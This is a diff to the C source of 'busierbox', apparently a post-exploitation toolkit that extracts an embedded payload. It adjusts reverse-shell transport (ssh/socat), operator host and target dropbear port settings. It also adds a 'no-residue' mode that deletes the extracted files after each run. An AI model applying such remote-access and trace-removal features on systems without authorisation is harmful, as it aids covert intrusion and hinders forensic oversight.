@@ -34,33 +34,48 @@
 #ifndef BUSIERBOX_ADVERTISE_PAYLOAD_TOOLS
 #define BUSIERBOX_ADVERTISE_PAYLOAD_TOOLS 0
 #endif
+#ifndef BB_RUNTIME_MODE
+#define BB_RUNTIME_MODE "extract"
+#endif
+#ifndef BB_RUNTIME_ROOT
+#define BB_RUNTIME_ROOT "./.busierbox"
+#endif
+#ifndef BB_RUNTIME_ALLOW_FALLBACK_ROOT
+#define BB_RUNTIME_ALLOW_FALLBACK_ROOT "no"
+#endif
+#ifndef BB_RUNTIME_FALLBACK_ROOT
+#define BB_RUNTIME_FALLBACK_ROOT "/tmp/.busierbox"
+#endif
 
-#ifndef BB_STAGER_CALLBACK_ENABLE
-#define BB_STAGER_CALLBACK_ENABLE "no"
-#endif
-#ifndef BB_STAGER_CALLBACK_HOST
-#define BB_STAGER_CALLBACK_HOST ""
-#endif
-#ifndef BB_STAGER_CALLBACK_PORT
-#define BB_STAGER_CALLBACK_PORT ""
-#endif
-#ifndef BB_STAGER_CALLBACK_SHELL
-#define BB_STAGER_CALLBACK_SHELL "sh"
-#endif
-#ifndef BB_STAGER_ZERO_ARG_MODE
-#define BB_STAGER_ZERO_ARG_MODE "help"
-#endif
-#ifndef BB_STAGER_POST_RECEIVE_ACTION
-#define BB_STAGER_POST_RECEIVE_ACTION "doctor"
-#endif
 #ifndef BB_FULL_ZERO_ARG_MODE
 #define BB_FULL_ZERO_ARG_MODE "help"
+#endif
+#ifndef BB_ZERO_ARG_MODE
+#define BB_ZERO_ARG_MODE BB_FULL_ZERO_ARG_MODE
+#endif
+#ifndef BB_ZERO_ARG_LOG_MODE
+#define BB_ZERO_ARG_LOG_MODE "quiet"
 #endif
 #ifndef BB_ZERO_ARG_CUSTOM_COMMAND
 #define BB_ZERO_ARG_CUSTOM_COMMAND ""
 #endif
 #ifndef BB_RSHELL_MODE
 #define BB_RSHELL_MODE "ssh"
+#endif
+#ifndef BB_RSHELL_TRANSPORT
+#define BB_RSHELL_TRANSPORT BB_RSHELL_MODE
+#endif
+#ifndef BB_RSHELL_AUTHKEYS_MODE
+#define BB_RSHELL_AUTHKEYS_MODE "disabled"
+#endif
+#ifndef BB_RSHELL_GENERATE_HOSTKEY_IF_MISSING
+#define BB_RSHELL_GENERATE_HOSTKEY_IF_MISSING "no"
+#endif
+#ifndef BB_RSHELL_SOCAT_PORT
+#define BB_RSHELL_SOCAT_PORT "22203"
+#endif
+#ifndef BB_BUILTIN_TLS_ENABLE
+#define BB_BUILTIN_TLS_ENABLE "no"
 #endif
 #ifndef BB_AUTORUN_GUARD_ENABLE
 #define BB_AUTORUN_GUARD_ENABLE "yes"
@@ -182,16 +197,23 @@ static int bb_applet_supported(const char *name)
 
 static int operator_reverse_ssh_possible(void)
 {
-    return !strcmp(BB_FULL_ZERO_ARG_MODE, "shell");
+    return !strcmp(BB_RSHELL_TRANSPORT, "ssh");
 }
 
 static void print_autoexec_config(void)
 {
-    printf("stager_zero_arg_mode=%s\n", BB_STAGER_ZERO_ARG_MODE);
-    printf("stager_post_receive_action=%s\n", BB_STAGER_POST_RECEIVE_ACTION);
-    printf("full_zero_arg_mode=%s\n", BB_FULL_ZERO_ARG_MODE);
+    printf("zero_arg_mode=%s\n", BB_ZERO_ARG_MODE);
+    printf("runtime_mode=%s\n", BB_RUNTIME_MODE);
+    printf("runtime_root=%s\n", BB_RUNTIME_ROOT);
+    printf("runtime_allow_fallback_root=%s\n", BB_RUNTIME_ALLOW_FALLBACK_ROOT);
+    printf("runtime_fallback_root=%s\n", BB_RUNTIME_FALLBACK_ROOT);
+    printf("zero_arg_log_mode=%s\n", BB_ZERO_ARG_LOG_MODE);
     printf("zero_arg_custom_command_set=%s\n", BB_ZERO_ARG_CUSTOM_COMMAND[0] ? "yes" : "no");
-    printf("rshell_mode=%s\n", BB_RSHELL_MODE);
+    printf("rshell_transport=%s\n", BB_RSHELL_TRANSPORT);
+    printf("rshell_authkeys_mode=%s\n", BB_RSHELL_AUTHKEYS_MODE);
+    printf("rshell_generate_hostkey_if_missing=%s\n", BB_RSHELL_GENERATE_HOSTKEY_IF_MISSING);
+    printf("rshell_socat_port=%s\n", BB_RSHELL_SOCAT_PORT);
+    printf("builtin_tls_enabled=%s\n", BB_BUILTIN_TLS_ENABLE);
     printf("rshell_operator_host=%s\n", BB_OPERATOR_SERVER_HOST);
     printf("rshell_target_dropbear_port=%s\n", BB_OPERATOR_TARGET_DROPBEAR_PORT);
     printf("autorun_guard_enabled=%s\n", BB_AUTORUN_GUARD_ENABLE);
@@ -424,7 +446,7 @@ static int candidate_payload(char *out, size_t outsz)
         }
     }
 
-    snprintf(path, sizeof(path), ".busierbox/payload");
+    snprintf(path, sizeof(path), "%s/payload", BB_RUNTIME_ROOT);
     if (payload_valid(path)) {
         snprintf(out, outsz, "%s", path);
         return 0;
@@ -516,17 +538,11 @@ static int dir_is_noexec(const char *path)
 static int choose_extract_root(char *out, size_t outsz)
 {
     char path[PATH_MAX];
-    uid_t uid = getuid();
-    const char *roots[] = {".busierbox", NULL, NULL, NULL};
-    char tmp[PATH_MAX], vartmp[PATH_MAX], shm[PATH_MAX];
+    const char *roots[] = {BB_RUNTIME_ROOT, NULL, NULL, NULL};
     int i;
 
-    snprintf(tmp, sizeof(tmp), "/tmp/busierbox-%ld", (long)uid);
-    snprintf(vartmp, sizeof(vartmp), "/var/tmp/busierbox-%ld", (long)uid);
-    snprintf(shm, sizeof(shm), "/dev/shm/busierbox-%ld", (long)uid);
-    roots[1] = tmp;
-    roots[2] = vartmp;
-    roots[3] = shm;
+    if (!strcmp(BB_RUNTIME_ALLOW_FALLBACK_ROOT, "yes"))
+        roots[1] = BB_RUNTIME_FALLBACK_ROOT;
 
     for (i = 0; i < 4; i++) {
         snprintf(path, sizeof(path), "%s", roots[i]);
@@ -1021,6 +1037,9 @@ static int ensure_payload(char *payload, size_t payloadsz)
     struct embedded_payload ep;
     int have_ep = (get_embedded_payload(&ep) == 0);
 
+    if (!strcmp(BB_RUNTIME_MODE, "core-only"))
+        return -1;
+
     if (candidate_payload(payload, payloadsz) == 0) {
         if (have_ep && !payload_id_matches(&ep, payload)) {
             fprintf(stderr, "busierbox: extracted payload is from a different binary; re-extracting...\n");
@@ -1115,6 +1134,46 @@ static int execv_alloc(const char *path, char **argv)
     execv(path, argv);
     fprintf(stderr, "busierbox: exec %s failed: %s\n", path, strerror(errno));
     return errno == ENOENT ? 127 : 126;
+}
+
+static void payload_root_from_payload(const char *payload, char *root, size_t rootsz)
+{
+    size_t len;
+    snprintf(root, rootsz, "%s", payload);
+    len = strlen(root);
+    if (len >= 8 && !strcmp(root + len - 8, "/payload"))
+        root[len - 8] = '\0';
+}
+
+static int exec_payload_command(const char *path, char **argv, const char *payload)
+{
+    pid_t pid;
+    int status;
+    char root[PATH_MAX];
+
+    if (strcmp(BB_RUNTIME_MODE, "no-residue") != 0)
+        return execv_alloc(path, argv);
+
+    pid = fork();
+    if (pid < 0) {
+        fprintf(stderr, "busierbox: fork %s failed: %s\n", path, strerror(errno));
+        return 1;
+    }
+    if (pid == 0) {
+        execv(path, argv);
+        fprintf(stderr, "busierbox: exec %s failed: %s\n", path, strerror(errno));
+        _exit(errno == ENOENT ? 127 : 126);
+    }
+    if (waitpid(pid, &status, 0) < 0)
+        return 1;
+    payload_root_from_payload(payload, root, sizeof(root));
+    if (root[0] && !strcmp(root, BB_RUNTIME_ROOT))
+        rm_rf(root);
+    if (WIFEXITED(status))
+        return WEXITSTATUS(status);
+    if (WIFSIGNALED(status))
+        return 128 + WTERMSIG(status);
+    return 1;
 }
 
 static int wait_status_ok(pid_t pid)
@@ -1259,7 +1318,7 @@ int bb_exec_payload_applet(const char *name, int argc, char **argv)
         child[argc] = NULL;
         if (!strcmp(name, "zsh"))
             setenv("SHELL", exe, 1);
-        ret = execv_alloc(exe, child);
+        ret = exec_payload_command(exe, child, payload);
         free(child);
         return ret;
     }
@@ -1273,6 +1332,11 @@ int bb_exec_payload_applet(const char *name, int argc, char **argv)
     for (i = 1; i < argc; i++)
         child[i + 1] = argv[i];
     child[argc + 1] = NULL;
+    if (strcmp(BB_RUNTIME_MODE, "no-residue") == 0) {
+        int ret = exec_payload_command(exe, child, payload);
+        free(child);
+        return ret;
+    }
     execv(exe, child);
     fprintf(stderr, "busierbox: exec BusyBox applet %s failed: %s\n", name, strerror(errno));
     free(child);
@@ -1404,14 +1468,14 @@ int applet_clean_main(int argc, char **argv)
 {
     if (is_help(argc, argv)) {
         puts("usage: busierbox clean");
-        puts("Removes the local .busierbox extraction directory.");
+        printf("Removes the configured BusierBox runtime directory (%s).\n", BB_RUNTIME_ROOT);
         return 0;
     }
-    if (rm_rf(".busierbox") != 0) {
+    if (rm_rf(BB_RUNTIME_ROOT) != 0) {
         fprintf(stderr, "clean: %s\n", strerror(errno));
         return 1;
     }
-    puts("clean: removed .busierbox");
+    printf("clean: removed %s\n", BB_RUNTIME_ROOT);
     return 0;
 }
 
@@ -1774,14 +1838,7 @@ int applet_doctor_main(int argc, char **argv)
     if (!path_exists("/dev/pts"))
         puts("recommendation=mount devpts for tmux/dropbear interactive sessions");
     printf("artifact_tier=%s\n", BUSIERBOX_ARTIFACT_TIER);
-    printf("stager_callback_enabled=%s\n", BB_STAGER_CALLBACK_ENABLE);
     print_autoexec_config();
-    if (!strcmp(BB_STAGER_CALLBACK_ENABLE, "yes")) {
-        printf("stager_callback_host=%s\n", BB_STAGER_CALLBACK_HOST[0] ? BB_STAGER_CALLBACK_HOST : "unset");
-        printf("stager_callback_port=%s\n", BB_STAGER_CALLBACK_PORT[0] ? BB_STAGER_CALLBACK_PORT : "unset");
-        printf("stager_callback_shell=%s\n", BB_STAGER_CALLBACK_SHELL);
-        puts("recommendation=callback support is explicit and non-persistent; verify target egress before use");
-    }
     if (have_payload) {
         char ti[PATH_MAX];
         snprintf(ti, sizeof(ti), "%s/share/terminfo", payload);
@@ -1813,13 +1870,7 @@ int applet_config_info_main(int argc, char **argv)
 #endif
     puts("core_static_status=see build output");
     printf("artifact_tier=%s\n", BUSIERBOX_ARTIFACT_TIER);
-    printf("stager_callback_enabled=%s\n", BB_STAGER_CALLBACK_ENABLE);
     print_autoexec_config();
-    if (!strcmp(BB_STAGER_CALLBACK_ENABLE, "yes")) {
-        printf("stager_callback_host=%s\n", BB_STAGER_CALLBACK_HOST);
-        printf("stager_callback_port=%s\n", BB_STAGER_CALLBACK_PORT);
-        printf("stager_callback_shell=%s\n", BB_STAGER_CALLBACK_SHELL);
-    }
     have_embedded = get_embedded_payload(&ep) == 0;
     have_payload = candidate_payload(payload, sizeof(payload)) == 0;
     printf("embedded_payload=%s\n", have_embedded ? "yes" : "no");
